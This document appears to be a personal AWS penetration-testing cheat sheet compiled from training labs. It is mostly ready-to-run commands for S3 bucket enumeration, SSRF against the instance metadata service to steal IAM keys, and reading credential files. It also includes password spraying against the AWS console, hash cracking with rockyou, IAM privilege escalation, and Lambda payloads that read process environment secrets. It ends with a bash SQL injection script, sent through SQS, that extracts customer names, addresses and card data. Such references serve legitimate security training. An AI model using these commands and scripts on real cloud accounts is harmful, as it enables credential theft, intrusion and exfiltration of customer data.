🕵️ Enumeration

```bash
aws configure --profile test  
aws configure set aws_session_token '<TOKEN>' --profile cognito

# To add new profiles when imperonstaing users with expiring tokens:
[profile impersonated-dev]
role_arn = arn:aws:iam::123456789012:role/DeveloperRole
source_profile = my-base-user
role_session_name = DevSession-JohnDoe
```

**CloudShell - generate expiring tokens**
```bash
TOKEN=$(curl -X PUT localhost:1338/latest/api/token -H "X-aws-ec2-metadata-token-ttl-seconds: 60")
curl localhost:1338/latest/meta-data/container/security-credentials -H "X-aws-ec2-metadata-token: $TOKEN"
```

---

🔍 Basic Recon

```bash
host <target-domain>
whois <target-domain>
```

🌐 DNS Enumeration

```bash
dnsenum <domain>
nslookup <domain>
dig <domain> any
```

🌐 Web Page Inspection

Manually inspect source code for:
- `AWSAccessKeyId`, `SecretAccessKey`
- `*.s3.amazonaws.com`
- API endpoints (e.g. `api.<domain>.com`)
- JavaScript files like `main.js`

☁️ cloud_enum
- Install and run: [https://github.com/initstring/cloud_enum](https://github.com/initstring/cloud_enum)
- Example:
	- `python3 cloud_enum.py -k <keyword>`

☁️ FUZZ
```bash
ffuf -u "https://hlogistics-ENVIRONMENT.s3.REGION.amazonaws.com" -w "regions.txt:REGION" -w "list.txt:ENVIRONMENT" -mc 200,403 -v 2>/dev/null
```
## 🪣 S3 Bucket Enumeration

```bash
# Unauthenticated
aws s3 ls s3://<bucket-name> --no-sign-request
aws s3 ls s3://<bucket-name>/<folder>/ --no-sign-request --recursive
aws s3 cp s3://<bucket-name>/<folder>/file.zip . --no-sign-request
aws s3api get-bucket-acl --bucket <bucket-name> --no-sign-request
aws s3api get-bucket-policy --bucket hl-it-admin --profile stor | jq -r '.Policy | fromjson'
aws s3api list-objects --bucket <bucket-name> --no-sign-request
aws s3api get-bucket-versioning --bucket huge-logistics-dashboard --no-sign-request
aws s3api list-object-versions --bucket huge-logistics-dashboard --query "Versions[?VersionId!='null']" --no-sign-request
aws s3api get-object --bucket huge-logistics-dashboard --key "private/Business Health - Board Meeting (Confidential).xlsx" --version-id "XXXXXXXXXXXXXXXXXXXXXXX" test.xlsx --no-sign-request                            

# Authenticated
aws configure --profile test                         # Use profiles with every `aws` command after configure to manage multiple creds
aws sts get-caller-identity --profile test           # Get Account ID for profile... `whoami` equivalent
aws s3 ls s3://dev.huge-logistics.com/<folder>/ --profile test
aws s3 cp s3://dev.huge-logistics.com/<folder>/ . --recursive --profile test
aws dynamodb list-tables --profile test
aws dynamodb describe-table --table analytics_app_users --profile test
aws dynamodb scan --table-name analytics_app_users --profile test > output.json

# Get the Bucket Policy
aws s3api get-bucket-policy --bucket dev.huge-logistics.com --profile admin | jq -r '.Policy | fromjson'
aws s3api get-object --bucket huge-logistics-dashboard --key "private/Business Health - Board Meeting (Confidential).xlsx" --version-id "XXXXXXXXXXXXXXXXXXXXXXX" test.xlsx --profile admin2
```

**With s3scanner:**

```bash
s3scanner --bucket <bucket-name>
```

**Hashes and password macro:**
```bash
hashid --john <HASH>                       # SHA-256 is promising
grep -r -A 1 'UserID\|PasswordHash' output.json | grep '"S"' | awk -F '"' '{ print $4 }' > user_hash
	username0
	hash0
	username1
	hash1
	...

--- Use vi macro: ---

vi user_hash
# start recording the macro
q
# name the macro "a"
a
# enter insert mode
i
# tap end of line button
End
# type :
:
# tap the delete key
Delete
# tap the down arrow key
down arrow
# exit insert mode
CTRL+C
# stop recording the macro
q

john user_hash --format=Raw-SHA256 --wordlist=/opt/lists/rockyou.txt --fork=4
john user_hash --format=Raw-SHA256 --show
```

**GoAWSConsoleSpray - Spray creds for AWS Dashboard login**
```bash
go install github.com/WhiteOakSecurity/GoAWSConsoleSpray@latest
./GoAWSConsoleSpray -a 243687662613 -u ../../users -p ../../passwords
```

## Leaky Buckets & Public Snapshots

```bash
# Bruteforce leaked bucket owner ID
aws configure                          # Paste the Access key ID & Secret access key
aws sts get-caller-identity            # Get Account ID (427648302155)... `whoami` equivalent
aws sts get-access-key-info --access-key-id <Access_Key>
s3-account-search arn:aws:iam::427648302155:role/LeakyBucket mega-big-tech

# Enumerate the bucket region
curl -I https://mega-big-tech.s3.amazonaws.com

# To list public snapshots, supply owner ID and region:
aws ec2 describe-snapshots --owner-ids 107513503799 --region us-east-1
```

## EC2 Instances

```bash
aws ec2 describe-instances --filters Name=instance-state-name,Values=running --query 'Reservations[].Instances[].[Tags[?Key==`Name`].Value | [0],InstanceId,Platform,State.Name,PrivateIpAddress,PublicIpAddress,InstanceType,PublicDnsName,KeyName]' --profile stor | jq

aws ec2 get-password-data --instance-id i-04cc1c2c7ec1af1b5 --priv-launch-key it-admin.pem --profile stor

pacu
> set_keys
> run ec2__enum
> y
```
---

## 🗂️ Directory Brute-Forcing

```
feroxbuster -u https://<target> -w /path/to/wordlist
gobuster dir -u https://<target> -w /usr/share/wordlists/dirb/common.txt
dirb https://<target>
```
- GUI: **DirBuster**

**SSRF**

```bash
# We can replace this existing parameter URL with the following URL using the internal link-local UP address `169.254.169.254` that hosts the metadata service:
http://app.huge-logistics.com/status/status.php?name=169.254.169.254/latest/meta-data/iam/info
	IAM role
	
# This reveals an IAM role configured and named `MetapwnedS3Access`. Enumerate the credentials for this role with:
http://app.huge-logistics.com/status/status.php?name=169.254.169.254/latest/meta-data/iam/security-credentials/MetapwnedS3Access
	AWS Keys
```


---

## 🗃️ Git Repository Exposure

```
curl -s https://<target>/.git/config
```

**Git Secrets:**
```bash
git clone https://github.com/awslabs/git-secrets
cd git-secrets
make install

git clone https://github.com/huge-logistics/cargo-logistics-dev
cd cargo-logistics-dev/
git secrets --install
git secrets --register-aws
git secrets --scan
git secrets --scan-history
git show abcdefg0123456789abcdefg0123456789:log-s3-test/log-upload.php
```

**Trufflehog:**
```bash
pip install trufflehog       # Exegol/docker
brew install trufflehog     # Mac
apt install trufflehog        # Debian

Or:

git clone https://github.com/trufflesecurity/trufflehog/; cd trufflehog
go install

trufflehog git file://cargo-logistics-dev/ --regex --no-entropy
trufflehog git https://github.com/huge-logistics/cargo-logistics-dev --max-depth 2
```

**Docker Scout & CodeCommit:**

```bash
# Docker Scout
docker search huge-logistics
curl https://hub.docker.com/v2/repositories/hljose/huge-logistics-terraform-runner/tags | jq
docker pull hljose/huge-logistics-terraform-runner:0.12

curl -fsSL https://raw.githubusercontent.com/docker/scout-cli/main/install.sh -o install-scout.sh
sh install-scout.sh
docker scout quickview
docker scout cves hljose/huge-logistics-terraform-runner:0.12

docker run -i -t hljose/huge-logistics-terraform-runner:0.12 /bin/bash
docker inspect hljose/huge-logistics-terraform-runner:0.12

# CodeCommit
aws codecommit list-repositories --profile docker
aws codecommit get-repository --repository-name vessel-tracking --profile docker
aws codecommit list-branches --repository-name vessel-tracking --profile docker
aws codecommit get-branch --repository-name vessel-tracking --branch-name dev --profile docker
	commit: b63f0756ce162a3928c4470681cf18dd2e4e2d5a
aws codecommit get-commit --repository-name vessel-tracking --commit-id b63f0756ce162a3928c4470681cf18dd2e4e2d5a --profile docker
	parent commit: 2272b1b6860912aa3b042caf9ee3aaef58b19cb1
aws codecommit get-differences --repository-name vessel-tracking --before-commit-specifier 2272b1b6860912aa3b042caf9ee3aaef58b19cb1 --after-commit-specifier b63f0756ce162a3928c4470681cf18dd2e4e2d5a --profile docker
	js/server.js
aws codecommit get-file --repository-name vessel-tracking --commit-specifier b63f0756ce162a3928c4470681cf18dd2e4e2d5a --file-path js/server.js --profile docker
```

Tools:

- `git-dumper`
- `git-secrets`
- `git-extractor`
- `trufflehog`

---

## 🧾 IAM Credential Hunting

```
cat ~/.aws/credentials
cat ~/.aws/config
```

**From EC2 Instance Metadata Service (IMDS):**

```
curl http://169.254.169.254/latest/meta-data/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

**IAM Brutforce Permissions**
```bash
cd pacu && ./cli.py
> set_keys
> ls
> iam__brutforce_permissions
```

---

## 🔧 System Info from EC2

```
curl http://169.254.169.254/latest/meta-data/iam/info
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>
nmcli device show
```

---

## 💥 Exploitation

---

## 🚨 Leaked Credentials

**Export credentials:**

```
export AWS_ACCESS_KEY_ID=<key>
export AWS_SECRET_ACCESS_KEY=<secret>
export AWS_SESSION_TOKEN=<token>  # Optional
```

**Verify:**

```
aws sts get-caller-identity
```


---

## 🧠 IAM Privilege Escalation

**Enumerate permissions:**

```bash
go install -v github.com/shabarkin/aws-enumerator@latest
aws-enumerator cred -aws_access_key_id <ACCESS_KEY> -aws_secret_access_key <SECRET_KEY> -aws_region eu-west-2
aws-enumerator enum -services all
aws-enumerator dump -services <service1>,<service2>                         # example is `secretsmanager` with `listsecrets` permission

aws secretsmanager list-secrets --query 'SecretList[*].[Name, Description, ARN]' --output json --profile client-huge       # See above comment
aws secretsmanager get-secret-value --secret-id ext/cost-optimization --profile client-huge

aws iam list-user-policies --user-name ecollins --profile brute
aws iam list-attached-user-policies --user-name ext-cost-user --profile ext-cost
aws iam get-user-policy --user-name ecollins --policy-name SSM_Parameter --profile brute

aws iam get-role --role-name ExternalCostOpimizeAccess --profile ext-cost
aws iam list-role-policies --role-name Cognito_StatusAppAuth_Role --profile cognito2
aws iam list-attached-role-policies --role-name ExternalCostOpimizeAccess --profile ext-cost
aws iam get-policy --policy-arn arn:aws:iam::427648302155:policy/ExtPolicyTest --profile ext-cost
aws iam get-policy-version --policy-arn arn:aws:iam::427648302155:policy/ExtPolicyTest --version-id v4 --profile ext-cost
```

**Simulate permissions:**

```bash
aws iam simulate-principal-policy --policy-source-arn arn:aws:iam::<account-id>:user/<user> --action-names <action>
aws sts assume-role --role-arn arn:aws:iam::427648302155:role/ExternalCostOpimizeAccess --role-session-name ExternalCostOpimizeAccess --profile -ext-cost
aws sts assume-role --role-arn arn:aws:iam::427648302155:role/ExternalCostOpimizeAccess --role-session-name ExternalCostOpimizeAccess --external-id 37911 --profile ext-cost
```

**List access keys:**

```
aws iam list-access-keys --user-name <username>
```

**List Public RDS & EC2 Snapshots:**

```bash
aws rds describe-db-instances
aws rds describe-db-instances --query 'DBInstances[*].PubliclyAccessible' --query 'DBInstances[*].DBInstanceIdentifier'
aws rds describe-db-snapshots --snapshot-type public --include-public --region us-east-1 | grep 104506445608        # grep for AWS Account ID
aws rds describe-db-cluster-snapshots --snapshot-type public --include-public --region us-east-1 | grep 104506445608     # grep for AWS Account ID

aws ec2 describe-snapshots --owner-ids 107513503799 --region us-east-1 --profile ebs
aws ec2 describe-snapshot-attribute --attribute createVolumePermission --snapshot-id snap-0123456789 --region us-east-1 --profile ebs
aws ec2 describe-snapshots --owner-id self --restorable-by-user-ids all --no-paginate --region us-east-1 --profile ebs

# AWS Console > Select Region > RDS Service - Snaphots > Public > Search: "<snapshot_name>" > Restore Snapshot > Restore DB Cluster > Setup EC2 Connection > Select | Create EC2 instance > Continue > Set up > modify cluster > NOW ssh to the EC2 instance (psql in EC2 optionally)
```

**EC2 Launch Templates:**

```bash
aws ec2 describe-launch-templates --profile lharris
aws ec2 describe-launch-template-versions --launch-template-name SCHEDULER --query "LaunchTemplateVersions[0].LaunchTemplateData.UserData" --output text --profile lharris | base64 --decode
```

**Abuse IAM policies to:**

- Create users
- Attach policies
- Assume roles
- Generate keys

---

## 🛠️ Exploiting S3 Buckets

**Download:**

```
aws s3 cp s3://<bucket-name>/<file> .
```

**Upload:**

```
aws s3 cp payload.sh s3://<bucket-name>/
```

**Exposed MSSQL on S3 Bucket:**

```mysql
nmap -Pn exposed.cw9ow1llpfvz.eu-north-1.rds.amazonaws.com
mysql -h exposed.cw9ow1llpfvz.eu-north-1.rds.amazonaws.com -u <user> -p
# Database commands to check grants
mysql> SHOW GRANTS FOR '<user>';
```


---

## ⚙️ Exploiting Lambda

**List functions:**

```
aws lambda list-functions --profile cognito2
aws lambda list-functions --output table --profile sqs
aws lambda get-function --function-name huge-logistics-stock --profile sqs
```

**Invoke function:**

```bash
aws lambda invoke --function-name <name> response.json --profile cognito2
aws lambda invoke --function-name huge-logistics-status --payload '{ "target": "http://example.com" }' response.json --profile cognito2
aws lambda invoke --cli-binary-format raw-in-base64-out --function-name huge-logistics-status --payload '{ "target": "http://example.com" }' response.json --profile cognito2
aws lambda invoke --function-name huge-logistics-status --payload '{ "target": "file:///proc/self/environ" }' response.json --profile cognito2
aws lambda invoke --function-name huge-logistics-stock output output --profile sqs
aws lambda invoke --function-name huge-logistics-stock --payload "{\"test\":\"test\"}" output --profile sqs
aws lambda invoke --function-name huge-logistics-stock --payload '{"test":"test"}' --cli-binary-format raw-in-base64-out output --profile sqs    # No work
aws lambda invoke --function-name huge-logistics-stock --payload "{\"DESC\":\"HLT6612\"}" output --profile sqs
```

**Get environment variables:**

```
aws lambda get-function-configuration --function-name <name> --profile cognito2
```

**SQS**

```bash
aws sqs list-queues --profile sqs
	https://eu-north-1.queue.amazonaws.com/254859366442/huge-analytics
aws sqs receive-message --queue-url https://eu-north-1.queue.amazonaws.com/254859366442/huge-analytics --message-attribute-names All --profile sqs
	trackingID
aws sqs send-message --queue-url https://eu-north-1.queue.amazonaws.com/254859366442/huge-analytics --message-attributes '{ "Weight": { "StringValue": "1337", "DataType":"Number"}, "Client": {"StringValue":"VELUS CORP.", "DataType": "String"}, "trackingID": {"StringValue":"HLT1337", "DataType":"String"}}' --message-body "Testing" --profile sqs
```

---

## 🏃 EC2 Privilege Escalation

- Extract IAM credentials via IMDS
- Lateral movement with reused SSH keys or misconfigured services

---
## Cognito

```bash
aws cognito-identity get-id --identity-pool-id us-east-1:d2fecd68-ab89-48ae-b70f-44de60381367 --no-sign
aws cognito-identity get-credentials-for-identity --identity-id <identity_id> --no-sign
aws cognito-idp sign-up --client-id <id> --username test --password 'Password123!'
aws cognito-idp sign-up --client-id <id> --username test_user --password <password> --user-attributes Name="email",Value="<email>" Name="name",Value="Test"
aws cognito-idp initiate-auth --client-id <id> --auth-flow USER_PASSWORD_AUTH --auth-parameters USERNAME=test,PASSWORD=Password123!
aws cognito-idp initiate-auth --client-id <client_id> --auth-flow USER_PASSWORD_AUTH --auth-parameters USERNAME=test_user,PASSWORD=<password>
aws cognito-idp confirm-sign-up --client-id <id> --username test_user --confirmation-code <Email_Code>       # No output, verifies account
aws cognito-identity get-id --identity-pool-id "us-east-1:d2fecd68-ab89-48ae-b70f-44de60381367" --logins "{ \"cognito-idp.us-east-1.amazonaws.com/us-east-1_8rcK7abtz\": \"<IdToken>\" }"                        # With slashes
aws cognito-identity get-credentials-for-identity --identity-id <identity-id> --logins "{ \"cognito-idp.us-east-1.amazonaws.com/us-east-1_8rcK7abtz\": \"<IdToken>\" }"

```

---
## 📜 CloudTrail Abuse

```
aws cloudtrail lookup-events
```

> ⚠️ If CloudTrail is disabled or misconfigured, activity may not be logged.

---

## 📦 Useful Tools

- `awscli`
- `cloud_enum`
- `s3scanner`
- `git-dumper`
- `gobuster`, `feroxbuster`, `dirb`, `dirbuster`
- `dnsenum`, `host`, `whois`, `dig`
- `nmcli`, `curl`, `jq`

---

## ✅ Tips

- Look for `.env`, `.git`, `config` leaks
- Use `aws sts get-caller-identity` to verify credentials
- On EC2, query `http://169.254.169.254` for metadata
- Don’t ignore Lambda, CloudTrail, or exposed APIs

---

# Scripts - SQS & Lambda SQLi
Fuzzing parameters for SQS and Lambda:
```bash
#!/bin/bash

i=0

for word in $(cat burp-parameter-names.txt); do
  cmd=$(aws lambda invoke --function-name huge-logistics-stock --payload "{\"$word\":\"test\"}" output --profile sqs);
  ((i=i+1))
  echo "Try $i: $word"
  if grep -q "Invalid event parameter" output;
  then
        rm output;
  else
        cat output; echo -e "\nFound parameter: $word" && break;
  fi;
done
```

SQS SQL Injection:

```bash
#!/bin/bash

output=default

while [ -n "$output" ]; do

    output=""

    aws sqs send-message --queue-url https://eu-north-1.queue.amazonaws.com/254859366442/huge-analytics --message-attributes "{ \"Weight\": { \"StringValue\": \"1337\", \"DataType\":\"Number\"}, \"Client\": {\"StringValue\":\"VELUS CORP.\\\" $1\", \"DataType\": \"String\"}, \"trackingID\": {\"StringValue\":\"HLT1337\", \"DataType\":\"String\"}}" --message-body "Testing" --profile sqs | tee &> /dev/null

    aws lambda invoke --function-name huge-logistics-stock --payload "{\"DESC\":\"HLT1337\"}" output --profile sqs &> /dev/null

    output=$(cat output | grep "Invalid")

    if [[ $output == "" ]]; then
        cat output | sed 's/delivered/\n/g' | awk -F"\"" '{ print $3 }' | grep -v "^:" | grep -v '^0' | sed '/^$/d'
    fi

done
```

Then:

```bash
./lambda_sqli.sh "SELECT null, @@version;-- -"
./lambda_sqli.sh "UNION SELECT null, @@version;-- -"
./lambda_sqli.sh "UNION SELECT null, null, @@version;-- -"
./lambda_sqli.sh "UNION SELECT null, null, null, @@version;-- -" 
./lambda_sqli.sh "UNION SELECT null, null, null, table_name FROM INFORMATION_SCHEMA.TABLES WHERE table_schema NOT IN ('information_schema', 'mysql')-- -"
./lambda_sqli.sh "UNION SELECT null, null, null, column_name FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name = 'customerData'-- -"
./lambda_sqli.sh "UNION SELECT null, null, null, CONCAT(clientName,':',address,':',cardUsed) FROM customerData-- -"
```